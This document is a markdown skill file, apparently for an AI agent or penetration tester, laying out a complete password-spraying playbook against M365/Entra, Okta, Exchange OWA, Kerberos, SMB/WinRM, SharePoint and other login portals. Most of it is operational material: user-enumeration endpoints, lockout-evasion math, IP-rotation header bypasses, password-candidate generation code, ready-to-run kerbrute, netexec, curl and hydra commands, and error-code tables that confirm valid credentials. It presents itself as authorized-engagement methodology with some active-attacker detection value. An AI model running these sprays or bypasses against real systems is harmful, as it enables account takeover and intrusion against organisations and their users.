---
name: password-spray-methodology
description: End-to-end password spray playbook. User enumeration, lockout detection, password pattern generation, spray execution across all protocols, error code differentials, and engagement discipline. Unifies M365/Entra, Okta, Exchange, Kerberos, SharePoint, XMLRPC, OIDC, and AD SMB/WinRM spraying into one methodology.
sources: authorized-engagements, m365-entra-attack, okta-attack, exchange-owa-attack, hunt-brute-force, hunt-auth-bypass, hunt-sharepoint, public_research
report_count: 2
---

# Password Spray Methodology

Password spraying is the highest-ROI credential attack: one (or few) passwords tried against many users. It's quiet, avoids lockouts, and succeeds where traditional brute force fails. This skill consolidates every spray vector, enumeration technique, pattern, and protocol across the entire skill catalog.

**This is a methodology skill.** Protocol-specific details live in their respective skills — cross-reference them for deep dives. This skill covers the **universal spray pipeline** that applies everywhere.

## When to Use

- Starting ANY engagement with a user list but no credentials
- Finding internet-facing login portals (OWA, Okta, ADFS, VPN, SSO, OIDC)
- After `hunt-ntlm-info` reveals AD domain/UPN format — feed into spray
- After `hunt-ldap` enumerates sAMAccountNames — feed into spray
- After `js-secrets-extraction` finds email patterns — feed into spray
- OneDrive 302/404 enum (from `m365-entra-attack`) confirms licensed users — spray them
- Any leaked credential dump from client — validate against all services
- Active-attacker detection via Smart Lockout differential

## Universal Spray Pipeline (5 Phases)

```
Phase 1: ENUMERATE USERS    → valid user list
Phase 2: DETECT LOCKOUT      → max attempts/min, throttle rate
Phase 3: GENERATE PASSWORDS  → 5-20 high-probability candidates
Phase 4: EXECUTE SPRAY       → per-protocol, low-and-slow
Phase 5: INTERPRET RESULTS   → error code differential → finding or discard
```

---

## Phase 1 — User Enumeration

The spray is only as good as the user list. Gather usernames BEFORE touching any auth endpoint.

### Universal Enumeration Sources

| Source | Technique | Lockout Risk | Skill Reference |
|--------|-----------|-------------|-----------------|
| **LinkedIn / company page** | Scrape employee names → `username-anarchy` | Zero | — |
| **OneDrive personal site** | `GET /personal/<user>_<domain>_com/_layouts/15/onedrive.aspx` → 302=exists, 404=no | Zero | `m365-entra-attack` |
| **Kerberos pre-auth** | `kerbrute userenum --dc <DC> --domain <DOMAIN> users.txt` | Zero (KDC_ERR_PREAUTH_REQUIRED does not count as auth failure) | — |
| **NTLM Type-2 decode** | Extract AD domain, NetBIOS name, computer name from anonymous probe | Zero | `hunt-ntlm-info` |
| **Jira user picker** | `/rest/api/2/user/picker?query=` — public on misconfigured instances | Zero | — |
| **Jenkins** | `/asynchPeople/` or `/securityRealm/user/<name>/` | Zero | — |
| **ManageEngine ADManager Plus** | Unauthenticated user listing on exposed instances | Zero | — |
| **WordPress REST API** | `/wp-json/wp/v2/users` — dumps authors with usernames | Zero | `hunt-wordpress` |
| **GitLab** | `/api/v4/users` — public on open instances | Zero | — |
| **O365 Autodiscover** | HARDENED — returns identical 200 for all (2024+) | Zero but dead | `m365-entra-attack` |
| **GetUserRealm** | HARDENED — returns same XML for any email in tenant | Zero but dead | `m365-entra-attack` |

### Username Format Generation

After scraping names, generate all org-likely formats:

```bash
# From a list of real names (First Last, one per line)
./username-anarchy -i names.txt > usernames.txt

# Common formats for enterprise targets:
# firstname.lastname, f.lastname, firstnamelastname, flastname
# firstname_lastname, lastname.firstname, firstname
# Also try: email prefix from known addresses (jdoe@ → jdoe)
```

### CeWL — Target-Specific Word Extraction

```bash
cewl -d 3 -m 6 --lowercase https://target.com -w target_words.txt
# Feeds both username generation AND password patterns
```

---

## Phase 2 — Lockout Detection & Throttle Math

### Four Rate-Limit States (from `hunt-brute-force`)

Before spraying, classify the target endpoint into one of four states:

| State | Signal | Spray Feasible? |
|-------|--------|----------------|
| **Hard lockout** | Account disabled after N fails; correct creds also fail | No (DoS finding instead) |
| **Soft IP throttle** | 429 or increasing latency keyed on source IP | Yes — bypass via IP rotation |
| **CAPTCHA injection** | 200 but body switches to CAPTCHA after N attempts | Maybe — check if API path skips it |
| **Silent shadow-throttle** | 200/401 on every request but submissions are dropped silently | TRAP — inject known-good value at known position to detect |

### Shadow-Throttle Detection (CRITICAL — the biggest false-negative)

```bash
# Inject a known-good credential at position 500
# If it stops working under load, shadow-throttle is active
# Your "no rate limit" conclusion was false
KNOWN_GOOD="user@target.com:CorrectP@ss"
for n in $(seq 0 600); do
  code=$(curl -sk -u "user${n}@target.com:WrongP@ss" -o /dev/null -w "%{http_code}" \
    "https://TARGET/auth-endpoint")
  echo "$n $code $(wc -c </tmp/bf_body)"
done
# Watch: status flips, time_total climbing, body size changing
```

### Smart Lockout Math (Microsoft Entra ID — from `m365-entra-attack`)

- **Default**: 10 failed sign-ins in 10 minutes → 1-minute lockout
- **Counter shared across ALL auth flows** (ROPC + SAML + IMAP + EWS + SMTP + device-code)
- **Mathematical guarantee**: with ≤1 attempt per user, you CANNOT cause Smart Lockout (1 < 10)
- **Any AADSTS50053 observed = PRE-EXISTING external attacker** → SOC finding

```python
HARD_CAP = 1  # per user per engagement LIFETIME — never higher
```

### Okta Lockout

- **Default**: 10 failed sign-ins (configurable, some orgs: 3)
- Discipline: ≤2 attempts per user lifetime (safer than Entra's 1 because Okta lockout can be 3)

### Exchange/OWA Rate Limit Test

```bash
for i in $(seq 1 5); do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
    -X POST "https://$TARGET/owa/auth.owa" \
    -d "destination=https://$TARGET/owa/&username=testuser$i@domain.com&password=WrongPass123!")
  echo "Attempt $i: HTTP $code"
done
# All same code → no rate limiting on this endpoint
```

### Concrete Throttle References

| Protocol | Safe Rate | Source |
|----------|----------|--------|
| M365 ROPC | ≤30 req/sec to login.microsoftonline.com (per IP) | Authorized engagement |
| M365 Smart Lockout | ≤1 attempt per user LIFETIME per engagement | Mathematical guarantee |
| Okta /authn | ≤2 attempts per user lifetime; slower than Entra (tuner-different anti-automation) | Authorized engagement |
| Exchange OWA | Test 5 rapid attempts first; if uniform, spray slowly | `exchange-owa-attack` |
| SharePoint SOAP | No rate limit observed on SP2013; still go slow | `hunt-sharepoint` |
| Kerberos (Kerbrute) | No lockout risk from pre-auth probe; spray pace: 1 password per full user list per hour | Public research |
| IP Rotation Bypass | `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `CF-Connecting-IP`, `True-Client-IP` | `hunt-brute-force` |
| NodeZero reference | 2 attempts per hour in production environments | Horizon3.ai (2022) |

---

## Phase 3 — Password Pattern Generation

### The Complexity Backfire (CRITICAL INSIGHT)

Password complexity policies (uppercase + lowercase + digit + special) produce MORE predictable passwords, not less. The human pattern is always the same: **Uppercase first letter + lowercase word + digit at end + ! at end**.

Observations from PACK analysis (Kacherginsky, 2013) across RockYou, LinkedIn, MySpace, Stratfor, Singles.org, FaithWriters, phpBB:

1. **`: ` (no transformation)** — 2-25% of all passwords are straight dictionary words
2. **`$1` (append "1")** — 0.5-5.5% of all passwords
3. **`$1 $2 $3`** — 0.1-0.6%
4. **`$1 $2`** — 0.08-0.5%
5. **Seasonal**: `Summer2024!`, `Winter2025!`, `Spring2026!`
6. **Company**: `<Brand>@2026`, `<Brand>@123`, `<City>@2026`
7. **Default rotation**: `Password@<year>`, `Welcome@<year>`, `Admin@<year>`

### Pattern Generation Recipe

```python
# 1. Company-derived patterns
brand_variants = ["CompanyName", "Company", "COMPANY", "company"]
years = ["2026", "2025", "2024", "2023", "26", "25"]
specials = ["", "!", "@", "#", "1", "123", "123!"]
seasonal = ["Summer", "Winter", "Spring", "Autumn", "Fall"]
passwords = []
for brand in brand_variants:
    for year in years:
        for spec in specials:
            passwords.append(f"{brand}{year}{spec}")
            passwords.append(f"{brand}@{year}")
for season in seasonal:
    for year in years:
        passwords.append(f"{season}{year}!")
        passwords.append(f"{season}{year}")

# 2. Plant/office city names from company website
cities = ["SaoPaulo", "Rio", "BH", "Brasilia"]
for city in cities:
    for year in years:
        for spec in specials:
            passwords.append(f"{city}{year}{spec}")

# 3. Functional account defaults
functional = ["noreply", "purchase", "accounts", "postmaster",
              "transport", "admin", "helpdesk", "support", "info"]
for func in functional:
    passwords.append(f"{func}@123")
    passwords.append(f"{func}{year}")
```

### Wordlist Strategy

| Stage | Wordlist | When |
|-------|----------|------|
| **1. Leaked creds** | Client-provided dump, stealer logs | Always first — each is the strongest guess for that user |
| **2. Company-specific** | CeWL output + brand patterns (Phase 3 recipe) | Every engagement |
| **3. Probable-Wordlists** | Top 100 from berzerk0's frequency-sorted list | When company patterns fail |
| **4. rockyou.txt top-N** | Filter to 8+ chars matching target policy | Fallback |
| **AVOID** | RockYou2024 | 98% garbage (hashes, truncated strings, unicode junk, Russian text) — zero practical value |
| **Custom mutations** | Apply Hashcat rules to company-specific list | Deep engagement |

```bash
# Generate mutated list with common rules
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule target_words.txt | sort -u > mutated.txt
```

---

## Phase 4 — Spray Execution Matrix

| Protocol | Endpoint | Spray Command | Rate Limit | Skill Ref |
|----------|----------|---------------|------------|-----------|
| **M365 ROPC** | `login.microsoftonline.com/common/oauth2/token` | Python `attempt()` with state file | ≤1/user/lifetime | `m365-entra-attack` |
| **Okta** | `<tenant>.okta.com/api/v1/authn` | curl POST `{"username":"...","password":"..."}` | ≤2/user/lifetime | `okta-attack` |
| **Exchange OWA** | `/owa/auth.owa` (POST), `/ews/Exchange.asmx` (Basic) | curl HTTP POST or Basic Auth | Test 5 rapid first | `exchange-owa-attack` |
| **Kerberos (AD)** | KDC (TCP 88) | `kerbrute passwordspray --dc <DC> -d <DOMAIN> users.txt '<password>'` | No lockout from spray | — |
| **SMB / WinRM** | TCP 445 / 5985 | `netexec smb 10.0.0.0/24 -u users.txt -p passwords.txt --continue-on-success` | Per-service | — |
| **SharePoint SOAP** | `/_vti_bin/Authentication.asmx` | POST SOAP Login envelope | No rate limit on SP2013 farms | `hunt-sharepoint` |
| **WordPress XMLRPC** | `/xmlrpc.php` | `system.multicall` batches hundreds in 1 request | None observed | `hunt-auth-bypass` |
| **OIDC password grant** | `/oauth2/token` (custom tenant) | `grant_type=password` with `client_id` | Depends on IdP | — |
| **Citrix NetScaler** | `/vpn/index.html`, `/cgi/login` | POST form credentials | Per-instance | — |
| **F5 BIG-IP** | `/tmui/login.jsp` | POST form credentials | Per-instance | — |
| **Atlassian** | `/rest/auth/1/session` (Basic) | curl -u | No rate limit on many instances | — |
| **Jenkins** | `/jnlpJars/jenkins-cli.jar`, `/script` | curl POST | Per-instance | — |

### Kerbrute — Spray AD Without Lockout

```bash
# Enumerate first (zero lockout risk)
./kerbrute_linux_amd64 userenum \
  --dc 10.10.10.5 \
  --domain corp.local \
  usernames.txt

# Then spray — one password at a time across ALL valid users
./kerbrute_linux_amd64 passwordspray \
  --dc 10.10.10.5 \
  --domain corp.local \
  valid_users.txt 'Summer2026!'
```

### NetExec — Multi-Protocol Spray

```bash
# Spray SMB across subnet
netexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success

# Spray WinRM
netexec winrm 10.10.10.0/24 -u users.txt -p passwords.txt

# Spray MSSQL
netexec mssql 10.10.10.0/24 -u users.txt -p passwords.txt

# Single credential validation
netexec smb 10.10.10.5 -u administrator -p 'P@ssw0rd!'

# [+] = valid auth  |  (Pwn3d!) = local admin on that machine
```

### Burp Intruder — OWA Spray

```bash
# POST request to /owa/auth.owa
# Sniper mode: variable on username field
# Fixed password field = common candidate
# Track timestamp between launches to avoid re-spraying same password
```

---

## Phase 5 — Error Code Differentials

The difference between "wrong password" and "correct password but blocked" is everything. The latter is a confirmed finding even without a token.

### AADSTS Codes (M365/Entra — from `m365-entra-attack`)

| Code | Meaning | Password Valid? | Action |
|------|---------|----------------|--------|
| **AADSTS50034** | User does not exist | N/A | Remove from list |
| **AADSTS50126** | Invalid password | ❌ | User exists — retry within cap |
| **AADSTS50053** | Account locked (Smart Lockout) | Unknown | PRE-EXISTING → SOC finding |
| **AADSTS53003** | CA blocked token issuance | ✅ YES | **STOP — VALID CREDENTIAL** |
| **AADSTS50076** | MFA required | ✅ YES | **VALID** — second factor needed |
| **AADSTS50079** | Strong auth required | ✅ YES | **VALID** |
| **AADSTS50158** | External auth required | ✅ YES | **VALID** |
| **AADSTS530003** | Device-state required | ✅ YES | **VALID** |

**CRITICAL TRAP — ROPC substring false-positive:**
When CA requires MFA, the error body includes `"claims":{"access_token":{"capolids":...}}`. A loose substring check `if "access_token" in raw_body` will false-positive every MFA-blocked attempt. **Always parse JSON, then check `if "access_token" in parsed_dict`.**

### Okta Codes (from `okta-attack`)

| Response | Meaning | Password Valid? |
|----------|---------|----------------|
| `200 status=MFA_REQUIRED` | MFA challenge waiting | ✅ YES |
| `200 status=SUCCESS + sessionToken` | Full auth (no MFA) | ✅ YES |
| `200 status=PASSWORD_EXPIRED` | Must change password | ✅ YES |
| `200 status=LOCKED_OUT` | Account locked | Unknown |
| `401 E0000004` | Auth failed (user doesn't exist OR wrong password — Okta unifies) | ❌ |
| `401 E0000119` | User is locked | Unknown |
| `429` | Rate-limit hit | — |

### Exchange OWA Codes

| Status | Meaning |
|--------|---------|
| 302 + Location to `/owa/` | ✅ VALID — authenticated |
| 200 with same login page | ❌ Invalid |
| Consistent HTTP codes across 5 rapid attempts | No rate limit — spray viable |

---

## Engagement Discipline

### Must Do

- **State file with atomic writes**: per-user attempt counter (JSON)
- **Engagement journal**: JSONL log of every attempt (timestamp, email, password first 4 chars, status, AADSTS code)
- **IP rotation log**: per-day: date, src-ip, ISP-AS, operator-handle, round
- **Test ALL tenants**: sister domains often have separate Entra tenants with different password policies
- **Kill switch**: stop run if LOCKED count exceeds threshold (suggests pre-existing attacker or miscount)
- **Leaked creds FIRST**: each is 1 cap-attempt against the strongest guess for that user

### Anti-Patterns (Don't Do These)

- **DON'T** use leaked cred across multiple resources — burns cap with no marginal benefit when CA blocks
- **DON'T** retry after AADSTS50053 — account is locked
- **DON'T** spray >30 req/sec sustained to login.microsoftonline.com — IP flagged for credential-stuffing
- **DON'T** use Entra-style spray pace on Okta — anti-automation is tuner-different
- **DON'T** retract a CA-block finding — AADSTS53003/50076/50079 = password is correct
- **DON'T** skip user enumeration — spraying without known-valid usernames is blind noise
- **DON'T** use RockYou2024 — 98% garbage (hashes, truncated strings, unicode junk)
- **DON'T** spray a user more than HARD_CAP times across the entire engagement lifetime
- **DON'T** confuse `*.oktapreview.com` with production — preview is non-prod, different severity

### Active-Attacker Detection (Highest-Impact Byproduct)

The Smart Lockout math guarantee (1 < 10) doubles as an active-attacker detector:

1. Cap: 1 attempt per user
2. Observe AADSTS50053 (LOCKED) on multiple users
3. **You did not cause these locks** (1 < 10 = mathematically impossible)
4. **An external attacker is actively spraying the tenant RIGHT NOW**
5. Cluster locked users alphabetically → clustering = attacker using sorted username list
6. Diff lockout count between spray-start and spray-end → new locks = attacker active during your session
7. Document locked email list as SOC-actionable finding

---

## Chain Table

| Chain | From | To | Impact |
|-------|------|-----|--------|
| User enum → spray → valid cred | `hunt-ntlm-info` | This skill | ATO |
| Sprayed cred → email access | This skill | `m365-entra-attack` | Data exfil |
| Spray → MFA challenge → bypass | This skill | `hunt-mfa-bypass` | Full ATO |
| Spray → valid cred → lateral | This skill | NetExec/impacket | Domain compromise |
| Spray → lockout observation → SOC alert | This skill | `mid-engagement-ir-detection` | IR finding |
| Spray → SharePoint SOAP cred → FedAuth → authenticated surface | This skill | `hunt-sharepoint` | SharePoint access |
| LDAP enum → sAMAccountName list → AD spray | `hunt-ldap` | This skill (Kerbrute) | Mass-ATO |

---

## Tool Summary

| Tool | Purpose | Command |
|------|---------|---------|
| **Kerbrute** | AD user enum + spray (no lockout) | `kerbrute userenum/passwordspray` |
| **NetExec (nxc)** | Multi-protocol spray (SMB, WinRM, MSSQL, RDP) | `netexec smb 10.0.0.0/24 -u users.txt -p passwords.txt` |
| **Burp Intruder** | HTTP POST spray (OWA, custom portals) | Sniper mode, variable username, fixed password |
| **CeWL** | Target-specific wordlist generation | `cewl -d 3 -m 6 --lowercase https://target.com -w words.txt` |
| **username-anarchy** | Username format generation from real names | `./username-anarchy -i names.txt > usernames.txt` |
| **Hashcat** | Password rule generation (PACK) + wordlist mutation | `hashcat --stdout -r rules/best64.rule words.txt` |
| **curl** | Manual spray probes, lockout tests | `curl -sk -u "user:pass" https://TARGET/endpoint` |
| **Python** | Custom spray script with state file + JSON parsing | See `m365-entra-attack` for ROPC template |
| **MailSniper** | Post-compromise GAL extraction from OWA | Amplifies spray list after first valid cred |
| **hydra** | HTTP form spray (legacy — prefer Burp Intruder) | `hydra -L users.txt -P passwords.txt http-post-form` |

---

## Related Skills

- **`m365-entra-attack`** — M365-specific ROPC validation, AADSTS code reference, OneDrive user enumeration, Smart Lockout math, tenant discovery
- **`okta-attack`** — Okta-specific spray endpoint, error codes, factor enumeration, lockout discipline
- **`exchange-owa-attack`** — OWA rate-limit testing, Basic Auth spray, NTLM Type-2 domain extraction, government naming patterns
- **`hunt-brute-force`** — Four rate-limit states, shadow-throttle detection, IP rotation bypass, OTP brute methodology
- **`hunt-auth-bypass`** — Legacy Protocol Matrix (WordPress XMLRPC, Citrix, F5, Atlassian spray endpoints)
- **`hunt-sharepoint`** — SharePoint SOAP Authentication.asmx anonymous credential brute-force (no rate limit)
- **`hunt-ldap`** — sAMAccountName enumeration → spray target list
- **`hunt-ntlm-info`** — NTLM Type-2 → UPN format → credential format for spray
- **`hunt-mfa-bypass`** — Spray → MFA challenge → bypass chain
- **`mid-engagement-ir-detection`** — Active-attacker detection via Smart Lockout lockout differential
- **`hunt-wordpress`** — REST API user enumeration → spray target list
